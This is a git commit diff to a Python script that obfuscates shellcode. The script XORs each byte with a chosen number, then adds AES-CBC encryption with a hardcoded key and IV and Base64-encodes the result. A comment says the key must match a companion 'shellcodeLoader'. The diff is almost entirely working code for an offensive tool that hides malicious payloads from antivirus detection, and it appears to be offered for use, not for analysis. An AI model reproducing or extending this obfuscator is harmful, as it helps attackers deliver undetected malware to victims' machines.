030a49748c822e4be3d6deb8c40343f81d7f89ef
j3ttt <332456691xt@gmail.com>
2021-07-27 09:33:10 +0800

    修改

--- main.py
+++ main.py
@@ -1,4 +1,8 @@
+import base64
 from argparse import ArgumentParser, FileType
+from binascii import b2a_hex
+
+from Crypto.Cipher import AES
 
 
 def process_confused(src, num, out):
@@ -13,21 +17,39 @@ def process_confused(src, num, out):
                 break
             ordCode = ord(bitCode) ^ num  # ord()返回读值是chr()对应十进制整数
             hexCode = hex(ordCode)
-            # print(hexCode)
             hexCode = hexCode.replace('0x', '')
-            # print(hexCode)
             if len(hexCode) == 1:
                 hexCode = '0' + hexCode
-            hexCode = r'\x'+hexCode  # \x UTF-8 编码
+            hexCode = r'\x' + hexCode  # \x UTF-8 编码
             shellcode_confused += hexCode
-            #print(shellcode_confused)
             shellcode_size += 1
-            src.close()
-            out.write(shellcode_confused)
-            out.close()
+        src.close()
+        shellcode_encrypt = process_ecrypt(shellcode_confused)  # AES加密
+        Base64_AES_shellcode = base64.encodebytes(shellcode_encrypt)  # 将返回的字节型数据转进行base64编码
+        out.write(Base64_AES_shellcode.decode('utf-8'))  # write() argument must be str, not bytes
+        out.close()
     except Exception as e:
         print(e)
-    return shellcode_size
+
+
+def add_to_16(code):
+    if len(code.encode('utf-8')) % 16:
+        add = 16 - (len(code.encode('utf-8')) % 16)
+    else:
+        add = 0
+    text = code + ('\0' * add)
+    return text.encode('utf-8')
+
+
+def process_ecrypt(code_confused):
+    key = '9999999999999999'.encode('utf-8')  # key值随便改，记得在shellcodeLoader中对应
+    mode = AES.MODE_CBC
+    iv = b'qqqqqqqqqqqqqqqq'  # iv也是
+    text = add_to_16(code_confused)
+    aes = AES.new(key, mode, iv)
+    cipher_text = aes.encrypt(text)
+    # 因为AES加密后的字符串不一定是ascii字符集的，输出保存可能存在问题，所以这里转为16进制字符串
+    return b2a_hex(cipher_text)
 
 
 def main():
@@ -38,8 +60,8 @@ def main():
     parser.add_argument('-o', '--output', help='out put confused shellcode', type=FileType('w+'), required=True)
     parser.add_argument('-n', '--num', help='number of shellcode be confused', type=int, default=50)
     args = parser.parse_args()
-    shellcode_size = process_confused(args.src, args.num, args.output)
-    print("[+]Shellcode 混淆完成, Shellcode Size:{}".format(shellcode_size))
+    process_confused(args.src, args.num, args.output)
+    print("[+]Shellcode 混淆完成, 请查看文件：{}".format(args.output.name))
 
 
 if __name__ == '__main__':
